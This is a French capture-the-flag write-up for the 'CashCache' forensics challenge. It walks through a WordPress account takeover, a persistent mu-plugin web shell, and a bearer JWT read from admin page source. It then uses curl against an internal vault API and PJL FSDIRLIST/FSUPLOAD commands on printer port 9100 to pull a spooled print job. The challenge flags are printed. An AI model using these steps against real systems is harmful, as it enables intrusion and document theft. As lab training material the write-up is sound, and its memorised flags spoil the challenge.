---
title: "CashCache · ATO WordPress → JWT → PJL"
platform: "HackerLab Benin 2026"
category: "forensics"
difficulty: "—"
points: 0
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/forensics/cashcache.md"
tags: [hackerlab-benin-2026, forensics]
status: published
---

# CashCache : Forensics · ATO WordPress → JWT vault → PJL imprimante

**Catégorie** : forensics  
**Flag** : `HLB2026{6fd533738da3184b5b157208f84ced36}`

## TL;DR

L'ATO sur `d.admin` (CVE-2026-9273) donne un shell RCE. Depuis ce shell, on récupère un Bearer JWT dans la config WordPress qui permet d'interroger l'API vault interne. La copie numérique du document est supprimée, mais une copie physique existe dans le spool de l'imprimante réseau. PJL `FSUPLOAD` permet de lire le fichier `.prn` directement.

## Chaîne d'exploitation

**1. ATO et RCE**

Même CVE-2026-9273 que Q1. Une fois `d.admin` compromis, on dépose le mu-plugin `zz-shell.php` pour un RCE persistant en tant que `www-data`.

**2. JWT Bearer**

La page admin "Coffre Numérique" (`/wp-admin/admin.php?page=vdc-vault`) affiche un token Bearer dans son source HTML :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiJ2ZGMtaW50ZWdyYXRpb24ifQ.tIIjDIS60YFAFuMbUkvLZmopHcgOq2eq3hPJ4zPV2Vs
```

**3. API vault**

```bash
curl -H "Authorization: Bearer <token>" http://vault:5000/api/documents
```

Le document id=1 (`OP-JANUS-financements-2026.pdf`) a le statut `deleted`. L'API le retourne quand même en tant qu'admin, mais son `content` indique "copie numérique supprimée". La note du document mentionne une "copie physique" sur l'imprimante `IMP-DIR-01`.

**4. PJL sur printer:9100**

Depuis le shell `www-data`, on peut atteindre `printer:9100`. Le protocole PJL permet de naviguer dans le filesystem de l'imprimante :

```
@PJL FSDIRLIST NAME="0:/saveDevice/SavedJobs/KeepJob"
```

Réponse : `OP-JANUS-financements-2026.prn` (677 octets).

```
@PJL FSUPLOAD NAME="0:/saveDevice/SavedJobs/KeepJob/OP-JANUS-financements-2026.prn" OFFSET=0 SIZE=677
```

Le fichier `.prn` contient :

```
Cle de validation du document :
    HLB2026{6fd533738da3184b5b157208f84ced36}
```

## Pièges

Le honeypot est affiché directement sur la page admin Coffre : `HLB2026{wp_r3s3t_p01s0n_r4c3_w0n}`. C'est le flag de Q1 (Inside Job), pas celui de CashCache. Ne pas s'arrêter là.

La race condition sur `d.admin` est critique : plusieurs agents qui tournent en parallèle écrasent mutuellement le mot de passe. Regrouper les commandes en une seule requête shell juste après le reset.

## À retenir

Les imprimantes réseau conservent les jobs dans leur spool longtemps après l'impression. PJL `FSDIRLIST` + `FSUPLOAD` permettent d'accéder à ces données sans authentification sur de nombreux modèles. L'accès depuis un conteneur Docker interne bypass souvent les ACLs réseau qui protègent le port 9100 en externe.
